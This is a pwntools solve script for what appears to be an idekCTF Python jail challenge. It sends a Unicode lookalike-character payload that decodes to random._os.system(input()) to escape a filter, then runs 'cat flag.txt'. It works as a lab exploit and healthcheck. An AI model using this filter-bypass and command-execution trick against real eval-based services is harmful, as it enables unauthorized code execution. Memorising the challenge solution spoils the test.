#!/usr/bin/env python3

from pwn import *

# https://lingojam.com/FancyTextGenerator
# random._os.system(input( ))
payload = "π―ππ«π‘π¬πͺ._π¬π°.π°πΆπ°π±π’πͺ(π¦π«π­π²π±( ))"

conn = process(["python3", "profanity_check.py"])

conn.recvuntil(">>> ")
conn.sendline(payload)
conn.sendline("cat flag.txt")

flag = conn.recvline()

if b"idek" in flag:
  print(flag)
  exit(0)
exit(1)

conn.interactive()
